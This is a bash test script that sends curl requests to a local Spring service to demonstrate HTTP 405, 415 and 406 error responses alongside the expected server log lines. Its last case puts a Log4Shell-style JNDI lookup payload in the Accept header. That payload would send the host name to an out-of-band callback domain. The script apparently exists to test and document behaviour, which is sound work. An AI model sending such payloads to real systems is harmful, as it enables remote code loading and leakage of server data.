#!/bin/bash

BOLD='\e[1m'
GREEN='\e[5;32m'
RED='\e[0;31m'
YELLOW='\e[;33m'
NC='\e[0m'

ensure_dependency() {
  if ! which "$1" &>/dev/null ; then
    echo -e "${RED}$1 not found${NC}"
    exit 1
  fi
}

ensure_dependency curl

print_header() {
  if [ ! -z "$1" ]; then
    echo -e "${BOLD}CASE: ${1}${NC}"
  fi
}

print_request() {
  if [ ! -z "$1" ]; then
    echo -e "${BOLD}REQUEST:${NC} ${YELLOW}${1}${NC}"
  fi
}

error_log() {
  echo ""
  echo -e "${BOLD}LOG:${NC} ${RED}${1}${NC}"
  echo ""
}

print_separator() {
  echo ""
  echo "---"
  echo ""
}

print_header "Success Case"
print_request "curl -v -XPOST -H \"Content-type: application/json\" -H \"Accept: application/json\" http://localhost:8080/test"
curl -v -XPOST -H "Content-type: application/json" -H "Accept: application/json" http://localhost:8080/test
print_separator

print_header "405 Method Not Allowed"
print_request "curl -v -H \"Content-type: application/json\" -H \"Accept: application/json\" http://localhost:8080/test"
curl -v -H "Content-type: application/json" -H "Accept: application/json" http://localhost:8080/test
error_log "WARN DefaultHandlerExceptionResolver : Resolved [org.springframework.web.HttpRequestMethodNotSupportedException: Request method 'GET' is not supported]"
print_separator

print_header "415 Unsupported Media Type"
print_request "curl -v -XPOST -H \"Content-type: */*\" -H \"Accept: */*\" http://localhost:8080/test"
curl -v -XPOST -H "Content-type: */*" -H "Accept: */*" http://localhost:8080/test
error_log "WARN DefaultHandlerExceptionResolver : Resolved [org.springframework.web.HttpMediaTypeNotSupportedException: Content-Type '*/*' is not supported]"
print_separator

print_header "406 Not Acceptable"
print_request "curl -v -XPOST -H \"Content-type: application/json\" -H \"Accept: application/pdf\" http://localhost:8080/test"
curl -v -XPOST -H "Content-type: application/json" -H "Accept: application/pdf" http://localhost:8080/test
error_log "WARN DefaultHandlerExceptionResolver : Resolved [org.springframework.web.HttpMediaTypeNotAcceptableException: No acceptable representation]"
print_separator

print_header "406 Not Acceptable 2"
print_request "curl -v -XPOST -H \"Content-type: application/json\" -H \"Accept: \${jndi:ldap://\${hostName}.accept.cdlr2fl71kdpn4800010d9ctw8zzd83r8.oast.me}\" http://localhost:8080/test"
curl -v -XPOST -H "Content-type: application/json" -H "Accept: \${jndi:ldap://\${hostName}.accept.cdlr2fl71kdpn4800010d9ctw8zzd83r8.oast.me}" http://localhost:8080/test
error_log "WARN DefaultHandlerExceptionResolver : Resolved [org.springframework.web.HttpMediaTypeNotAcceptableException: No acceptable representation]"
print_separator
